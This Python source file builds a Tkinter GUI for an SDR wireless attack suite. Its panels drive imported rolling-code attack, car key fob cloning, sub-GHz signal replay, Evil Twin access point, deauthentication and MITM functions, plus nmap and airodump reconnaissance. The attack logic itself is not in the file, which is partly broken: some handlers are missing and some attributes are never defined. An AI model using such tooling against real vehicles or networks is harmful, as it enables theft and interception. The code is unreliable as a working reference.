"""
Enhanced Wireless Security Scanner - Advanced Features UI
Redesigned interface exposing XFi, Evil Twin, Deep Identity, and more
"""

import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

from core import Device_Object, Protocol, DeviceType, DeviceRegistry
from modules.data_visualizer import DataVisualizer

# Attack Modules
from modules.attacks.rolling_code_attack import RollingCodeAttack
from modules.auto_subghz_engine import AutoSubGhzEngine

class AdvancedScannerGUI:
    """
    Redesigned UI with feature-focused panels:
    - Device Discovery (main)
    - XFi Cross-Tech
    - Evil Twin Controls
    - Deep Identity
    - Recon & Security
    """
    
    def __init__(self, root, registry, scanner_modules, config: Dict):
        self.root = root
        
        # Auto-initialize if running standalone or registry/modules not provided
        if registry is None:
            print("[GUI] Registry not provided, creating new DeviceRegistry")
            self.registry = DeviceRegistry()
        else:
            self.registry = registry
            
        if scanner_modules is None:
            print("[GUI] Scanner modules not provided, initializing...")
            from modules import SDRController, SubGHzScanner
            from core import DiscoveryEngine
            
            discovery_engine = DiscoveryEngine(config)
            
            # Init HackRF
            sdr = SDRController()
            sdr_available = sdr.open()
            
            scanners = {
                'subghz': SubGHzScanner(sdr, self.registry, discovery_engine, config) if sdr_available else None,
            }
            
            # Start them
            if scanners['subghz']: scanners['subghz'].start()
            
            self.scanner_modules = scanners
        else:
            self.scanner_modules = scanner_modules
            
        self.config = config
        
        # Scanner modules
        self.subghz = self.scanner_modules.get('subghz')
        
        # Data Backbone (Matrix) - Simplified for SDR
        self.visualizer = DataVisualizer()
        
        # Sub-GHz Automation Setup
        from modules.subghz_recorder import SubGhzRecorder
        
        # 1. Init Recorder
        self.subghz_recorder = SubGhzRecorder(self.subghz.sdr if self.subghz else None)
        self.scanner_modules['recorder'] = self.subghz_recorder # Add to dict for update loop
        
        # 2. Init Rolling Code Attack (with recorder)
        self.rolling_code_engine = RollingCodeAttack(
            sdr_controller=self.subghz.sdr if self.subghz else None,
            recorder=self.subghz_recorder
        )
        
        # 3. Init Auto SubGHz Engine
        # Default presets if none from config
        subghz_presets = config.get('subghz_presets', [
            {'name': 'Car Fob (US)', 'freq': 315.0},
            {'name': 'Garage/Gate', 'freq': 433.92},
            {'name': 'Smart Meter', 'freq': 915.0}
        ])
        
        self.auto_subghz = AutoSubGhzEngine(
            scanner=self.subghz,
            registry=self.registry,
            config=self.config,
            recorder=self.subghz_recorder
        )
        
        # SDR Hook
        if self.subghz:
            self.subghz.register_callback(
                lambda freq, proto, raw: self.visualizer.feed_packet(f"SubGhz:{proto}", f"{freq/1e6:.1f}MHz", raw, False)
            )

        # UI State
        self.selected_device = None
        
        self._setup_ui()
        self._start_update_loop()
        
        # Initial data refresh
        self.root.after(1000, self._refresh_rf_list)
    
    def _setup_ui(self):
        """Create modern multi-panel UI"""
        # Get screen dimensions for responsive sizing
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Set window to 90% of screen size
        window_width = int(screen_width * 0.9)
        window_height = int(screen_height * 0.9)
        
        # Center on screen
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        
        # Initialize protocol detector and vehicle cloner
        try:
            from modules.protocol_detector import ProtocolDetector
            from modules.vehicle_clone import VehicleCloner
            
            self.protocol_detector = ProtocolDetector()
            print("[GUI] Protocol detector initialized")
            
            # Initialize vehicle cloner if SDR available
            if self.subghz and self.subghz.sdr:
                self.vehicle_cloner = VehicleCloner(
                    sdr_controller=self.subghz.sdr,
                    recorder=self.scanner_modules.get('recorder'),
                    protocol_detector=self.protocol_detector
                )
                print("[GUI] Vehicle cloner initialized")
            else:
                self.vehicle_cloner = None
                print("[GUI] Vehicle cloner not available (no SDR)")
        except Exception as e:
            print(f"[GUI] Failed to initialize cloner: {e}")
            self.protocol_detector = None
            self.vehicle_cloner = None
        
        # Window setup
        self.root.title("Advanced Wireless Security Scanner - v2.1-DEBUG")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0F172A')
        
        # Style setup
        style = ttk.Style()
        style.theme_use('default')
        style.configure("TProgressbar", thickness=15, troughcolor='#334155', background='#3B82F6', bordercolor='#1E293B')
        style.configure("Green.Horizontal.TProgressbar", thickness=15, troughcolor='#334155', background='#10B981')

        # Make resizable
        self.root.resizable(True, True)
        
        # Main container
        main = tk.Frame(self.root, bg='#0F172A')
        main.pack(fill=tk.BOTH, expand=True)
        
        # Top Toolbar
        self._create_toolbar(main)
        
        # Content Area (Tabbed)
        self.notebook = ttk.Notebook(main)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Tab 1: Live Spectrum (The Matrix)
        # self._create_matrix_tab()  # REMOVED per user request
        
        # Tab 1: Live Spectrum Visualizer
        self._create_spectrum_tab()
        
        # Tab 2: Attacks Control Panel (SDR Only)
        self._create_attacks_tab()
        
        # Tab 3: Sub-Ghz Recordings
        self._create_recordings_tab()
        
        # Status Bar
        self._create_status_bar(main)
    
    def _create_recordings_tab(self):
        """Sub-GHz Recordings Management"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="📼 Recordings")
        
        tk.Label(tab, text="Sub-GHz Signal Capture Library", font=('Arial', 12, 'bold'),
                fg='#F59E0B', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=10)
        
        # Treeview
        columns = ('ID', 'Name', 'Freq', 'Date')
        self.signal_tree = ttk.Treeview(tab, columns=columns, show='headings', height=15)
        
        for col in columns:
            self.signal_tree.heading(col, text=col)
        self.signal_tree.column('ID', width=50)
        self.signal_tree.column('Name', width=200)
        self.signal_tree.column('Freq', width=100)
        
        self.signal_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Controls
        ctrl = tk.Frame(tab, bg='#1E293B')
        ctrl.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(ctrl, text="▶ Replay Selected", command=self._replay_selected,
                 bg='#10B981', fg='white').pack(side=tk.LEFT, padx=5)
                 
        tk.Button(ctrl, text="🗑 Delete", command=self._delete_recording,
                 bg='#EF4444', fg='white').pack(side=tk.LEFT, padx=5)
                 
        tk.Button(ctrl, text="🔄 Refresh", command=self._update_recordings_list,
                 bg='#3B82F6', fg='white').pack(side=tk.LEFT, padx=5)
                 
        # Track last known state
        self._last_recordings_count = 0
        
        # Initial population (delayed to allow recorder init)
        self.root.after(500, self._update_recordings_list)
        
        # Schedule periodic refresh (3 seconds - less aggressive)
        self._schedule_recordings_refresh()

    def _delete_recording(self):
        # Stub
        pass
        
    def _replay_selected(self):
        sel = self.signal_tree.selection()
        if not sel: return
        item = self.signal_tree.item(sel[0])
        rec_id = item['values'][0]
        
        # Retrieve recording details from DB
        rec = self.scanner_modules.get('recorder')
        if not rec: return
        
        entry = next((r for r in rec.db if r['id'] == rec_id), None)
        if not entry: return
        
        print(f"[GUI] Replaying {entry['name']}...")
        
        # Run in thread to not block GUI
        def _replay_thread():
             success = rec.replay(rec_id)
             if success: print("[GUI] Replay complete")
             else: print("[GUI] Replay failed")
             
        threading.Thread(target=_replay_thread, daemon=True).start()
        
    def _create_toolbar(self, parent):
        """Top toolbar with quick actions"""
        toolbar = tk.Frame(parent, bg='#1E293B', height=50)
        toolbar.pack(fill=tk.X, padx=0, pady=0)
        
        # Logo/Title
        tk.Label(toolbar, text="🔍 SDR INTELLIGENCE SUITE", 
                font=('Arial', 14, 'bold'), fg='#3B82F6', bg='#1E293B').pack(side=tk.LEFT, padx=20)
        
        # Quick Stats
        self.stat_subghz = tk.Label(toolbar, text="📻 SubGHz: 0", font=('Arial', 10), 
                                    fg='#F59E0B', bg='#1E293B')
        self.stat_subghz.pack(side=tk.LEFT, padx=10)
        
        # Spacer
        tk.Frame(toolbar, bg='#1E293B').pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Action Buttons
        pass
    
    def _create_discovery_tab(self):
        """Main device discovery tab"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="📡 Device Discovery")
        
        # Split: List (Left) + Details (Right)
        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL, bg='#0F172A', sashwidth=3)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # LEFT: Device List
        left = tk.Frame(paned, bg='#1E293B')
        paned.add(left, width=900)
        
        tk.Label(left, text="Discovered Devices", font=('Arial', 12, 'bold'),
                fg='white', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        # Filter
        filter_frame = tk.Frame(left, bg='#1E293B')
        filter_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(filter_frame, text="Filter:", fg='#94A3B8', bg='#1E293B').pack(side=tk.LEFT)
        self.filter_var = tk.StringVar(value="All")
        filter_combo = ttk.Combobox(filter_frame, textvariable=self.filter_var,
                                    values=["All", "WiFi", "Bluetooth", "Sub-GHz", "Zigbee", "Anchors"],
                                    width=15, state='readonly')
        filter_combo.pack(side=tk.LEFT, padx=5)
        filter_combo.bind('<<ComboboxSelected>>', lambda e: self._update_device_list())
        
        # Treeview
        columns = ('Icon', 'Name', 'IP', 'Type', 'Protocol', 'RSSI', 'Vendor', 'Last Seen')
        self.device_tree = ttk.Treeview(left, columns=columns, show='headings', height=20)
        
        for col in columns:
            self.device_tree.heading(col, text=col)
        
        self.device_tree.column('Icon', width=40)
        self.device_tree.column('Name', width=180)
        self.device_tree.column('IP', width=120)
        self.device_tree.column('Type', width=100)
        self.device_tree.column('Protocol', width=100)
        self.device_tree.column('RSSI', width=70)
        self.device_tree.column('Vendor', width=120)
        self.device_tree.column('Last Seen', width=80)
        
        scrollbar = ttk.Scrollbar(left, orient=tk.VERTICAL, command=self.device_tree.yview)
        self.device_tree.configure(yscroll=scrollbar.set)
        
        self.device_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=5)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Context Menu
        self.device_tree.bind('<Button-3>', self._show_device_context_menu)
        self.device_tree.bind('<<TreeviewSelect>>', self._on_device_select)
        
        # RIGHT: Device Details
        right = tk.Frame(paned, bg='#1E293B')
        paned.add(right, width=600)
        
        tk.Label(right, text="Device Details", font=('Arial', 12, 'bold'),
                fg='white', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        self.detail_text = tk.Text(right, bg='#0F172A', fg='#E2E8F0', 
                                   font=('Courier New', 10), wrap=tk.WORD)
        self.detail_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Tag colors
        self.device_tree.tag_configure('anchor', background='#1E3A8A', foreground='white')
        self.device_tree.tag_configure('security', background='#DC2626', foreground='white')
        self.device_tree.tag_configure('xfi', background='#7C3AED', foreground='white')
    
    def _create_xfi_tab(self):
        """XFi Cross-Technology Detection Tab"""
        # Create scrollable container
        container = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(container, text="⚡ XFi Cross-Tech")
        
        canvas = tk.Canvas(container, bg='#0F172A', highlightthickness=0)
        scrollbar = ttk.Scrollbar(container, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg='#0F172A')
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        tab = scrollable_frame  # Use scrollable frame as tab root
        
        # Header
        header = tk.Frame(tab, bg='#1E293B')
        header.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(header, text="⚡ XFi: Cross-Technology IoT Detection",
                font=('Arial', 14, 'bold'), fg='#8B5CF6', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        
        tk.Label(header, text="Decode Zigbee/LoRa via Wi-Fi corruption",
                font=('Arial', 9), fg='#94A3B8', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        
        # Status
        status_frame = tk.Frame(tab, bg='#1E293B')
        status_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.xfi_status = tk.Label(status_frame, text="⚠️ Status: Driver patch required for full XFi",
                                   font=('Arial', 10), fg='#F59E0B', bg='#1E293B')
        self.xfi_status.pack(side=tk.LEFT, padx=10)
        
        # XFi Detections List
        tk.Label(tab, text="Detected IoT Devices (via Wi-Fi Hitchhiking)",
                font=('Arial', 11, 'bold'), fg='white', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=5)
        
        columns = ('Time', 'Protocol', 'Device ID', 'Payload', 'Confidence')
        self.xfi_tree = ttk.Treeview(tab, columns=columns, show='headings', height=15)
        
        for col in columns:
            self.xfi_tree.heading(col, text=col)
        
        self.xfi_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Controls
        control_frame = tk.Frame(tab, bg='#1E293B')
        control_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(control_frame, text="🔍 Force Full Scan", command=self._xfi_force_scan,
                 bg='#8B5CF6', fg='white', font=('Arial', 10, 'bold'),
                 relief=tk.FLAT, padx=20, pady=8).pack(side=tk.LEFT, padx=5)
        
        tk.Button(control_frame, text="📋 Export XFi Log", command=self._xfi_export,
                 bg='#3B82F6', fg='white', font=('Arial', 10, 'bold'),
                 relief=tk.FLAT, padx=20, pady=8).pack(side=tk.LEFT, padx=5)
    
    def _create_evil_twin_tab(self):
        """Evil Twin AP Controls Tab"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="🎭 Evil Twin AP")
        
        # WARNING Banner
        warning = tk.Frame(tab, bg='#DC2626')
        warning.pack(fill=tk.X)
        tk.Label(warning, text="⚠️ WARNING: AUTHORIZED TESTING ONLY - Illegal use punishable by law",
                font=('Arial', 11, 'bold'), fg='white', bg='#DC2626').pack(pady=10)
        
        # Controls
        control = tk.Frame(tab, bg='#1E293B')
        control.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(control, text="Evil Twin Configuration", font=('Arial', 12, 'bold'),
                fg='white', bg='#1E293B').grid(row=0, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        
        # Interface
        tk.Label(control, text="Interface:", fg='#94A3B8', bg='#1E293B').grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
        self.et_interface = tk.Entry(control, width=20)
        self.et_interface.insert(0, self.config.get('hardware', {}).get('wifi_adapter', 'wlan0'))
        self.et_interface.grid(row=1, column=1, padx=10, pady=5)
        
        # Authorization
        self.et_authorized = tk.BooleanVar(value=False)
        tk.Checkbutton(control, text="✅ I have written authorization", variable=self.et_authorized,
                      fg='#F59E0B', bg='#1E293B', selectcolor='#0F172A',
                      font=('Arial', 10, 'bold')).grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
        
        self.var_auto_mitm = tk.BooleanVar(value=False)
        self.var_auto_handshake = tk.BooleanVar(value=False)
        self.var_auto_subghz = tk.BooleanVar(value=False)  # Default OFF - user can enable manually
        
        # Auto-action Checkboxes
        auto_frame = tk.Frame(control, bg='#1E293B')
        auto_frame.grid(row=3, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)

        tk.Label(auto_frame, text="Auto-Actions:", fg='#94A3B8', bg='#1E293B').grid(row=0, column=0, sticky=tk.W)

        # Checkboxes 
        tk.Checkbutton(auto_frame, text="Auto-MITM", variable=self.var_auto_mitm, 
                      command=self._toggle_auto_mitm, bg='#1E293B', fg='#A855F7',
                      selectcolor='#1E293B', activebackground='#1E293B').grid(row=0, column=4, padx=5)
                      
        tk.Checkbutton(auto_frame, text="Auto-Handshake", variable=self.var_auto_handshake,
                      command=self._toggle_auto_handshake, bg='#1E293B', fg='#A855F7',
                      selectcolor='#1E293B', activebackground='#1E293B').grid(row=0, column=5, padx=5)
                      
        # Auto-SubGHz Checkbox
        tk.Checkbutton(auto_frame, text="Auto-Record (SubGHz)", variable=self.var_auto_subghz,
                      command=self._toggle_auto_subghz, bg='#1E293B', fg='#DC2626',
                      selectcolor='#1E293B', activebackground='#1E293B', font=('Arial', 10, 'bold')).grid(row=0, column=6, padx=5)
        
        # Trigger the callback for the default True value
        self._toggle_auto_subghz()

        # Buttons
        btn_frame = tk.Frame(tab, bg='#1E293B')
        btn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(btn_frame, text="💀 Full MITM", command=self._et_enable_mitm,
                  bg='#F59E0B', fg='white', font=('Arial', 10, 'bold'),
                  relief=tk.FLAT, padx=20, pady=10).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="1️⃣ Start Discovery", command=self._et_start_discovery,
                 bg='#3B82F6', fg='white', font=('Arial', 10, 'bold'),
                 relief=tk.FLAT, padx=20, pady=10).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="2️⃣ Create Twin", command=self._et_create_twin,
                 bg='#8B5CF6', fg='white', font=('Arial', 10, 'bold'),
                 relief=tk.FLAT, padx=20, pady=10).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="3️⃣ Deauth Attack", command=self._et_deauth,
                 bg='#DC2626', fg='white', font=('Arial', 10, 'bold'),
                 relief=tk.FLAT, padx=20, pady=10).pack(side=tk.LEFT, padx=5)
        
        # Target List
        tk.Label(tab, text="Discovered Targets (from Probe Requests)",
                font=('Arial', 11, 'bold'), fg='white', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=5)
        
        columns = ('SSID', 'Clients', 'Probes', 'Security')
        self.et_tree = ttk.Treeview(tab, columns=columns, show='headings', height=10)
        
        for col in columns:
            self.et_tree.heading(col, text=col)
        
        self.et_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Log
        tk.Label(tab, text="Evil Twin Log", font=('Arial', 10, 'bold'),
                fg='white', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=5)
        
        self.et_log = tk.Text(tab, bg='#0F172A', fg='#10B981', 
                             font=('Courier New', 9), height=8)
        self.et_log.pack(fill=tk.X, padx=10, pady=5)
    
    def _create_identity_tab(self):
        """Deep Identity & Spatial Anchors Tab"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="🧠 Deep Identity")
        
        # Split: Identity (Top) + Anchors (Bottom)
        paned = tk.PanedWindow(tab, orient=tk.VERTICAL, bg='#0F172A', sashwidth=3)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # TOP: Deep Identity Results
        top = tk.Frame(paned, bg='#1E293B')
        paned.add(top, height=400)
        
        tk.Label(top, text="🧠 Deep Identity Inference Results",
                font=('Arial', 12, 'bold'), fg='#10B981', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        tk.Label(top, text="Powered by: JA4 Fingerprinting + Traffic Analysis + OUI",
                font=('Arial', 9), fg='#94A3B8', bg='#1E293B').pack(anchor=tk.W, padx=10)
        
        columns = ('Device', 'Inferred Type', 'Confidence', 'Explanation', 'JA4')
        self.identity_tree = ttk.Treeview(top, columns=columns, show='headings', height=10)
        
        for col in columns:
            self.identity_tree.heading(col, text=col)
        
        self.identity_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # BOTTOM: Spatial Anchors
        bottom = tk.Frame(paned, bg='#1E293B')
        paned.add(bottom, height=300)
        
        tk.Label(bottom, text="⚓ Spatial Anchor Nodes (RSSI Stabilization)",
                font=('Arial', 12, 'bold'), fg='#3B82F6', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        tk.Label(bottom, text="Right-click devices in Discovery tab to designate as anchors",
                font=('Arial', 9), fg='#94A3B8', bg='#1E293B').pack(anchor=tk.W, padx=10)
        
        columns = ('Device', 'Baseline RSSI', 'Current RSSI', 'Alpha Factor', 'Status')
        self.anchor_tree = ttk.Treeview(bottom, columns=columns, show='headings', height=8)
        
        for col in columns:
            self.anchor_tree.heading(col, text=col)
        
        self.anchor_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
    
    def _create_sbfd_tab(self):
        """SBFD: Routing Security & Reboot Detection"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="🛑 SBFD / Routing")
        
        # Header
        header = tk.Frame(tab, bg='#1E293B')
        header.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(header, text="🛡️ SBFD: Sequence-Based Failure Detection",
                font=('Arial', 12, 'bold'), fg='#EF4444', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        
        tk.Label(header, text="Detects: Node Reboots • Routing Changes • Path Instability",
                font=('Arial', 9), fg='#94A3B8', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        
        # Split: Events (Top) + Health (Bottom)
        paned = tk.PanedWindow(tab, orient=tk.VERTICAL, bg='#0F172A', sashwidth=3)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # TOP: Event Log
        top = tk.Frame(paned, bg='#1E293B')
        paned.add(top, height=300)
        
        tk.Label(top, text="⚠️ Detected Security Events (Reboots/Path Changes)",
                font=('Arial', 10, 'bold'), fg='white', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        columns = ('Time', 'Device', 'Event', 'Confidence', 'Details')
        self.sbfd_tree = ttk.Treeview(top, columns=columns, show='headings', height=10)
        
        for col in columns:
            self.sbfd_tree.heading(col, text=col)
            
        self.sbfd_tree.column('Time', width=80)
        self.sbfd_tree.column('Device', width=120)
        self.sbfd_tree.column('Event', width=100)
        self.sbfd_tree.column('Confidence', width=80)
        self.sbfd_tree.column('Details', width=300)
        
        self.sbfd_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # BOTTOM: Node Health
        bottom = tk.Frame(paned, bg='#1E293B')
        paned.add(bottom, height=200)
        
        tk.Label(bottom, text="🏥 Node Health & Stability Score",
                font=('Arial', 10, 'bold'), fg='white', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        h_columns = ('Device', 'Health Score', 'Status', 'Stability (s)', 'Changes')
        self.sbfd_health_tree = ttk.Treeview(bottom, columns=h_columns, show='headings', height=8)
        
        for col in h_columns:
            self.sbfd_health_tree.heading(col, text=col)
            
        self.sbfd_health_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

    def _update_sbfd_list(self):
        """Update SBFD GUI"""
        if not self.wifi_monitor or not hasattr(self.wifi_monitor, 'sbfd_analyzer'):
            return
            
        analyzer = self.wifi_monitor.sbfd_analyzer
        
        # Update Events
        events = analyzer.get_recent_events(300) # Last 5 mins
        # Simple diff check or clear/redraw (redraw for simplicity)
        for item in self.sbfd_tree.get_children():
            self.sbfd_tree.delete(item)
            
        for e in reversed(events):
            ts = time.strftime('%H:%M:%S', time.localtime(e.timestamp))
            color = "#EF4444" if e.event_type == "REBOOT" else "#F59E0B"
            # Treeview tags for color not easily supported in default theme without config
            # Just insert for now
            self.sbfd_tree.insert('', 'end', values=(
                ts, e.device_id, e.event_type, f"{e.confidence:.0%}", e.details
            ))
            
        # Update Health
        for item in self.sbfd_health_tree.get_children():
            self.sbfd_health_tree.delete(item)
            
        for dev_id in list(analyzer.paths.keys()):
             health = analyzer.get_device_health(dev_id)
             score_emoji = "🟢" if health['health_score'] > 0.8 else "🟡" if health['health_score'] > 0.5 else "🔴"
             
             self.sbfd_health_tree.insert('', 'end', values=(
                 dev_id,
                 f"{score_emoji} {health['health_score']:.0%}",
                 health['status'],
                 f"{health['stability']:.0f}s",
                 health['change_count']
             ))

    def _create_recon_tab(self):
        """Reconnaissance & Security Tab"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="🔍 Recon & Security")
        
        # Security System Report
        tk.Label(tab, text="🎥 Security System Detection Report",
                font=('Arial', 12, 'bold'), fg='#DC2626', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=10)
        
        self.security_text = tk.Text(tab, bg='#1E293B', fg='#E2E8F0',
                                     font=('Courier New', 10), height=12)
        self.security_text.pack(fill=tk.X, padx=10, pady=5)
        
        # DNS Recon Controls
        dns_frame = tk.Frame(tab, bg='#1E293B')
        dns_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(dns_frame, text="🌐 DNS Reconnaissance", font=('Arial', 11, 'bold'),
                fg='#3B82F6', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        tk.Label(dns_frame, text="Target IP:", fg='#94A3B8', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        self.dns_target = tk.Entry(dns_frame, width=20)
        self.dns_target.pack(side=tk.LEFT, padx=5)
        
        tk.Button(dns_frame, text="Run DNSRecon", command=self._run_dnsrecon,
                 bg='#3B82F6', fg='white', relief=tk.FLAT, padx=15, pady=5).pack(side=tk.LEFT, padx=5)
        
        # Nmap Controls
        nmap_frame = tk.Frame(tab, bg='#1E293B')
        nmap_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(nmap_frame, text="🔍 Network Scan (Nmap)", font=('Arial', 11, 'bold'),
                fg='#10B981', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        tk.Label(nmap_frame, text="Subnet:", fg='#94A3B8', bg='#1E293B').pack(side=tk.LEFT, padx=10)
        self.nmap_subnet = tk.Entry(nmap_frame, width=20)
        self.nmap_subnet.insert(0, "192.168.1.0/24")
        self.nmap_subnet.pack(side=tk.LEFT, padx=5)
        
        tk.Button(nmap_frame, text="Scan Subnet", command=self._run_nmap,
                 bg='#10B981', fg='white', relief=tk.FLAT, padx=15, pady=5).pack(side=tk.LEFT, padx=5)
        
        
        # Kali Toolbox (Airodump-ng / Airmon-ng) - Legacy/Power User
        kali_frame = tk.Frame(tab, bg='#1E293B')
        kali_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(kali_frame, text="⚔️ Kali Linux Toolbox", font=('Arial', 11, 'bold'),
                fg='#F59E0B', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
                
        tk.Button(kali_frame, text="▶ Start Airmon/Airodump", 
                 command=lambda: self.recon.start() if self.recon else messagebox.showerror("Error", "Recon module disabled"),
                 bg='#10B981', fg='white', relief=tk.FLAT, padx=15, pady=5).pack(side=tk.LEFT, padx=10)
                 
        tk.Button(kali_frame, text="⏹ Stop Recon", 
                 command=lambda: self.recon.stop() if self.recon else None,
                 bg='#EF4444', fg='white', relief=tk.FLAT, padx=15, pady=5).pack(side=tk.LEFT, padx=10)

        # Recon Results
        tk.Label(tab, text="Reconnaissance Results", font=('Arial', 10, 'bold'),
                fg='white', bg='#0F172A').pack(anchor=tk.W, padx=10, pady=5)
        
        self.recon_text = tk.Text(tab, bg='#0F172A', fg='#10B981',
                                  font=('Courier New', 9), height=10)
        self.recon_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
    
    def _create_status_bar(self, parent):
        """Bottom status bar"""
        status = tk.Frame(parent, bg='#1E293B', height=30)
        status.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_label = tk.Label(status, text="🟢 Scanner Active | Devices: 0 | XFi: Monitoring",
                                     font=('Arial', 9), fg='#10B981', bg='#1E293B')
        self.status_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        self.time_label = tk.Label(status, text="", font=('Arial', 9), fg='#64748B', bg='#1E293B')
        self.time_label.pack(side=tk.RIGHT, padx=10, pady=5)
    
    # ========== Update Loops ==========
    
    def _start_update_loop(self):
        """Start background update thread"""
        def update():
            while True:
                try:
                    # Update SDR-only components
                    self._update_stats()
                    self._update_recordings_list()
                    self.time_label.config(text=datetime.now().strftime("%H:%M:%S"))
                    
                    # Periodic restart of scanner if needed? 
                    # For now just update UI
                    
                except Exception as e:
                    import traceback
                    traceback.print_exc()
                    print(f"[GUI] Update error: {e}")
                time.sleep(2)
        
        threading.Thread(target=update, daemon=True).start()
    
    def _schedule_recordings_refresh(self):
        """Schedule next auto-refresh (slower refresh to avoid UI jank)"""
        self.root.after(3000, self._auto_refresh_recordings)
    
    def _auto_refresh_recordings(self):
        """Auto-refresh only if count changed"""
        rec = self.scanner_modules.get('recorder')
        if rec:
            try:
                recordings = rec.list_recordings()
                if len(recordings) != self._last_recordings_count:
                    self._update_recordings_list()
                    self._last_recordings_count = len(recordings)
            except:
                pass
        # Schedule next check
        self._schedule_recordings_refresh()
    
    def _update_recordings_list(self):
        """Update Sub-GHz recordings list (smart refresh with selection preservation)"""
        if not hasattr(self, 'signal_tree'): 
            return
            
        rec = self.scanner_modules.get('recorder')
        if not rec: 
            return
            
        try:
            recordings = rec.list_recordings()
            
            # Preserve selection
            current_selection = self.signal_tree.selection()
            selected_id = self.signal_tree.item(current_selection[0])['values'][0] if current_selection else None
            
            # Clear and rebuild
            for item in self.signal_tree.get_children():
                self.signal_tree.delete(item)
                
            for r in recordings:
                 try:
                     ts = time.strftime('%Y-%m-%d %H:%M', time.localtime(r['timestamp']))
                     item_id = self.signal_tree.insert('', 'end', values=(r['id'], r['name'], f"{r['freq_mhz']} MHz", ts))
                     
                     # Restore selection if this was the selected item
                     if selected_id and r['id'] == selected_id:
                         self.signal_tree.selection_set(item_id)
                         self.signal_tree.focus(item_id)
                 except Exception as ex:
                     print(f"[GUI] Error inserting item {r.get('id', '?')}: {ex}")
                     
            print(f"[GUI] Recordings list updated: {len(recordings)} items")
                  
        except Exception as e:
            print(f"[GUI] Error updating recordings: {e}")
    
    # [Removed Legacy Update Methods: Device, XFi, Identity]
    
    # SDR-Only Update Methods
    def _update_stats(self):
         """Update status bar"""
         count = 0 
         if hasattr(self, 'subghz') and self.subghz:
              # Get count from registry for subghz protocol
              pass # TODO: fetch actual count
         self.status_label.config(text=f"🟢 System Active | SDR: Online")

    # [Deleted non-SDR methods: XFi, EvilTwin, Recon, DeepID, Anchors]

    
